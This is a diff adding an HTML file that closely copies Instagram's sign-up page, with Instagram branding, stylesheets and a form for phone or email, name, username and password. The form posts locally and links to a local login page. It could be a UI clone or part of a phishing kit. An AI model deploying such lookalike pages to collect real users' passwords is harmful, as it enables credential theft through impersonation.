@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="en" class="js not-logged-in client-root js-focus-visible sDN5V">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <title>Instagram</title>
+
+
+  <meta name="robots" content="noimageindex, noarchive">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="theme-color" content="#ffffff">
+  <meta id="viewport" name="viewport"
+    content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
+  <link rel="preload" href="https://instagram.com/static/bundles/es6/ConsumerUICommons.css/595343eae33b.css" as="style" type="text/css"
+    crossorigin="anonymous">
+  <link rel="preload" href="https://instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/1f357aa4db8e.css" as="style" type="text/css"
+    crossorigin="anonymous">
+  <link rel="preload" href="https://instagram.com/static/bundles/es6/Consumer.css/0a7a489a7b90.css" as="style" type="text/css"
+    crossorigin="anonymous">
+  <link rel="preload" href="https://instagram.com/static/bundles/es6/LandingPage.css/d79d0462eced.css" as="style" type="text/css"
+    crossorigin="anonymous">
+  <link rel="prefetch" as="stylesheet" href="https://instagram.com/static/bundles/es6/FeedPageContainer.css/6ece99d4a42f.css" type="text/css"
+    crossorigin="anonymous">
+  <link rel="mask-icon" href="https://instagram.com/static/images/ico/favicon.svg/fc72dd4bfde8.svg" color="#262626">
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+  <meta property="al:ios:app_name" content="Instagram">
+  <meta property="al:ios:app_store_id" content="389801252">
+  <meta property="al:ios:url" content="instagram://mainfeed">
+  <meta property="al:android:app_name" content="Instagram">
+  <meta property="al:android:package" content="com.instagram.android">
+  <meta property="al:android:url" content="https://www.instagram.com/_n/mainfeed/">
+  <meta property="og:site_name" content="Instagram">
+  <meta property="og:title" content="Instagram">
+  <meta property="og:image" content="/static/images/ico/favicon-200.png/ab6eff595bb1.png">
+  <meta property="fb:app_id" content="124024574287414">
+  <meta property="og:url" content="https://instagram.com/">
+  <meta
+    content="Create an account or log in to Instagram - A simple, fun &amp; creative way to capture, edit &amp; share photos, videos &amp; messages with friends &amp; family."
+    name="description">
+
+  <link href="https://instagram.com/static/bundles/es6/LandingPage.css/d79d0462eced.css" type="text/css" crossorigin="anonymous"
+    rel="stylesheet">
+  <style type="text/css">
+    .fb_hidden {
+      position: absolute;
+      top: -10000px;
+      z-index: 10001
+    }
+
+    .fb_reposition {
+      overflow: hidden;
+      position: relative
+    }
+
+    .fb_invisible {
+      display: none
+    }
+
+    .fb_reset {
+      background: none;
+      border: 0;
+      border-spacing: 0;
+      color: #000;
+      cursor: auto;
+      direction: ltr;
+      font-family: "lucida grande", tahoma, verdana, arial, sans-serif;
+      font-size: 11px;
+      font-style: normal;
+      font-variant: normal;
+      font-weight: normal;
+      letter-spacing: normal;
+      line-height: 1;
+      margin: 0;
+      overflow: visible;
+      padding: 0;
+      text-align: left;
+      text-decoration: none;
+      text-indent: 0;
+      text-shadow: none;
+      text-transform: none;
+      visibility: visible;
+      white-space: normal;
+      word-spacing: normal
+    }
+
+    .fb_reset>div {
+      overflow: hidden
+    }
+
+    @keyframes fb_transform {
+      from {
+        opacity: 0;
+        transform: scale(.95)
+      }
+
+      to {
+        opacity: 1;
+        transform: scale(1)
+      }
+    }
+
+    .fb_animate {
+      animation: fb_transform .3s forwards
+    }
+
+    .fb_dialog {
+      background: rgba(82, 82, 82, .7);
+      position: absolute;
+      top: -10000px;
+      z-index: 10001
+    }
+
+    .fb_dialog_advanced {
+      border-radius: 8px;
+      padding: 10px
+    }
+
+    .fb_dialog_content {
+      background: #fff;
+      color: #373737
+    }
+
+    .fb_dialog_close_icon {
+      background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;
+      cursor: pointer;
+      display: block;
+      height: 15px;
+      position: absolute;
+      right: 18px;
+      top: 17px;
+      width: 15px
+    }
+
+    .fb_dialog_mobile .fb_dialog_close_icon {
+      left: 5px;
+      right: auto;
+      top: 5px
+    }
+
+    .fb_dialog_padding {
+      background-color: transparent;
+      position: absolute;
+      width: 1px;
+      z-index: -1
+    }
+
+    .fb_dialog_close_icon:hover {
+      background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent
+    }
+
+    .fb_dialog_close_icon:active {
+      background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent
+    }
+
+    .fb_dialog_iframe {
+      line-height: 0
+    }
+
+    .fb_dialog_content .dialog_title {
+      background: #6d84b4;
+      border: 1px solid #365899;
+      color: #fff;
+      font-size: 14px;
+      font-weight: bold;
+      margin: 0
+    }
+
+    .fb_dialog_content .dialog_title>span {
+      background: url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;
+      float: left;
+      padding: 5px 0 7px 26px
+    }
+
+    body.fb_hidden {
+      height: 100%;
+      left: 0;
+      margin: 0;
+      overflow: visible;
+      position: absolute;
+      top: -10000px;
+      transform: none;
+      width: 100%
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading {
+      background: url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;
+      min-height: 100%;
+      min-width: 100%;
+      overflow: hidden;
+      position: absolute;
+      top: 0;
+      z-index: 10001
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading.centered {
+      background: none;
+      height: auto;
+      min-height: initial;
+      min-width: initial;
+      width: auto
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner {
+      width: 100%
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content {
+      background: none
+    }
+
+    .loading.centered #fb_dialog_loader_close {
+      clear: both;
+      color: #fff;
+      display: block;
+      font-size: 18px;
+      padding-top: 20px
+    }
+
+    #fb-root #fb_dialog_ipad_overlay {
+      background: rgba(0, 0, 0, .4);
+      bottom: 0;
+      left: 0;
+      min-height: 100%;
+      position: absolute;
+      right: 0;
+      top: 0;
+      width: 100%;
+      z-index: 10000
+    }
+
+    #fb-root #fb_dialog_ipad_overlay.hidden {
+      display: none
+    }
+
+    .fb_dialog.fb_dialog_mobile.loading iframe {
+      visibility: hidden
+    }
+
+    .fb_dialog_mobile .fb_dialog_iframe {
+      position: sticky;
+      top: 0
+    }
+
+    .fb_dialog_content .dialog_header {
+      background: linear-gradient(from(#738aba), to(#2c4987));
+      border-bottom: 1px solid;
+      border-color: #043b87;
+      box-shadow: white 0 1px 1px -1px inset;
+      color: #fff;
+      font: bold 14px Helvetica, sans-serif;
+      text-overflow: ellipsis;
+      text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0;
+      vertical-align: middle;
+      white-space: nowrap
+    }
+
+    .fb_dialog_content .dialog_header table {
+      height: 43px;
+      width: 100%
+    }
+
+    .fb_dialog_content .dialog_header td.header_left {
+      font-size: 12px;
+      padding-left: 5px;
+      vertical-align: middle;
+      width: 60px
+    }
+
+    .fb_dialog_content .dialog_header td.header_right {
+      font-size: 12px;
+      padding-right: 5px;
+      vertical-align: middle;
+      width: 60px
+    }
+
+    .fb_dialog_content .touchable_button {
+      background: linear-gradient(from(#4267B2), to(#2a4887));
+      background-clip: padding-box;
+      border: 1px solid #29487d;
+      border-radius: 3px;
+      display: inline-block;
+      line-height: 18px;
+      margin-top: 3px;
+      max-width: 85px;
+      padding: 4px 12px;
+      position: relative
+    }
+
+    .fb_dialog_content .dialog_header .touchable_button input {
+      background: none;
+      border: none;
+      color: #fff;
+      font: bold 12px Helvetica, sans-serif;
+      margin: 2px -12px;
+      padding: 2px 6px 3px 6px;
+      text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0
+    }
+
+    .fb_dialog_content .dialog_header .header_center {
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      line-height: 18px;
+      text-align: center;
+      vertical-align: middle
+    }
+
+    .fb_dialog_content .dialog_content {
+      background: url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;
+      border: 1px solid #4a4a4a;
+      border-bottom: 0;
+      border-top: 0;
+      height: 150px
+    }
+
+    .fb_dialog_content .dialog_footer {
+      background: #f5f6f7;
+      border: 1px solid #4a4a4a;
+      border-top-color: #ccc;
+      height: 40px
+    }
+
+    #fb_dialog_loader_close {
+      float: left
+    }
+
+    .fb_dialog.fb_dialog_mobile .fb_dialog_close_button {
+      text-shadow: rgba(0, 30, 84, .296875) 0 -1px 0
+    }
+
+    .fb_dialog.fb_dialog_mobile .fb_dialog_close_icon {
+      visibility: hidden
+    }
+
+    #fb_dialog_loader_spinner {
+      animation: rotateSpinner 1.2s linear infinite;
+      background-color: transparent;
+      background-image: url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);
+      background-position: 50% 50%;
+      background-repeat: no-repeat;
+      height: 24px;
+      width: 24px
+    }
+
+    @keyframes rotateSpinner {
+      0% {
+        transform: rotate(0deg)
+      }
+
+      100% {
+        transform: rotate(360deg)
+      }
+    }
+
+    .fb_iframe_widget {
+      display: inline-block;
+      position: relative
+    }
+
+    .fb_iframe_widget span {
+      display: inline-block;
+      position: relative;
+      text-align: justify
+    }
+
+    .fb_iframe_widget iframe {
+      position: absolute
+    }
+
+    .fb_iframe_widget_fluid_desktop,
+    .fb_iframe_widget_fluid_desktop span,
+    .fb_iframe_widget_fluid_desktop iframe {
+      max-width: 100%
+    }
+
+    .fb_iframe_widget_fluid_desktop iframe {
+      min-width: 220px;
+      position: relative
+    }
+
+    .fb_iframe_widget_lift {
+      z-index: 1
+    }
+
+    .fb_iframe_widget_fluid {
+      display: inline
+    }
+
+    .fb_iframe_widget_fluid span {
+      width: 100%
+    }
+  </style>
+</head>
+
+<body class="" style="">
+
+  <span id="react-root">
+    <section class="_9eogI E3X2T">
+      <div></div>
+      <main class="SCxLW  o64aR" role="main">
+        <article class="_4_yKc">
+          <div class="rgFsT ">
+            <div class="gr27e ">
+              <h1 class="NXVPg Szr5J  coreSpriteLoggedOutWordmark">Instagram</h1>
+              <div class="P8adC">
+                <form class="XFYOY" method="post">
+                  <h2 class="vvzhL ">Sign up to see photos and videos from your friends.</h2>
+                  <div
+                    class="                  Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
+                    <button class="sqdOP  L3NKy   y3zKF     " type="button"><span
+                        class="coreSpriteFacebookIconInverted cneKx"></span>Log in with Facebook</button></div>
+                  <div class="K-1uj hKTMS">
+                    <div class="s311c"></div>
+                    <div class="_0tv-g">or</div>
+                    <div class="s311c"></div>
+                  </div>
+                  <div class="WZdjL">
+                    <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Mobile Number or
+                          Email</span><input class="_2hvTZ pexuQ zyHYP" aria-label="Mobile Number or Email"
+                          aria-required="true" autocapitalize="off" autocomplete="tel" autocorrect="off"
+                          name="emailOrPhone" type="text" value=""></label>
+                      <div class="i24fI"></div>
+                    </div>
+                  </div>
+                  <div class="WZdjL">
+                    <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Full Name</span><input
+                          class="_2hvTZ pexuQ zyHYP" aria-label="Full Name" aria-required="false"
+                          autocapitalize="sentences" autocorrect="off" name="fullName" type="text" value=""></label>
+                      <div class="i24fI"></div>
+                    </div>
+                  </div>
+                  <div class="WZdjL">
+                    <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Username</span><input
+                          class="_2hvTZ pexuQ zyHYP" aria-label="Username" aria-required="true" autocapitalize="off"
+                          autocorrect="off" maxlength="30" name="username" type="text" value=""></label>
+                      <div class="i24fI"></div>
+                    </div>
+                  </div>
+                  <div class="WZdjL">
+                    <div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Password</span><input
+                          class="_2hvTZ pexuQ zyHYP" aria-label="Password" aria-required="true" autocapitalize="off"
+                          autocomplete="new-password" autocorrect="off" name="password" type="password"
+                          value=""></label>
+                      <div class="i24fI"></div>
+                    </div>
+                  </div>
+                  <div>
+                    <div
+                      class="                  Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    ">
+                      <button class="sqdOP  L3NKy   y3zKF     " type="submit">Sign up</button></div>
+                  </div>
+                  <p class="g4Vm4">By signing up, you agree to our <a target="_blank"
+                      href="https://help.instagram.com/581066165581870">Terms</a> , <a target="_blank"
+                      href="https://help.instagram.com/519522125107875">Data Policy</a>
+                    </p>
+                </form>
+              </div>
+            </div>
+            <div class="gr27e">
+              <p class="izU2O">Have an account? <a href="/login.html">Log in</a></p>
+            </div>
+          </div>
+        </article>
+      </main>
+      <footer class="_8Rna9  _3Laht " role="contentinfo"></footer>
+    </section>
+  </span>
+
+
+
+
+
+  <link rel="stylesheet" href="https://instagram.com/static/bundles/es6/ConsumerUICommons.css/595343eae33b.css" type="text/css"
+    crossorigin="anonymous">
+  <link rel="stylesheet" href="https://instagram.com/static/bundles/es6/ConsumerAsyncCommons.css/1f357aa4db8e.css" type="text/css"
+    crossorigin="anonymous">
+  <link rel="stylesheet" href="https://instagram.com/static/bundles/es6/Consumer.css/0a7a489a7b90.css" type="text/css"
+    crossorigin="anonymous">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+
+</html>
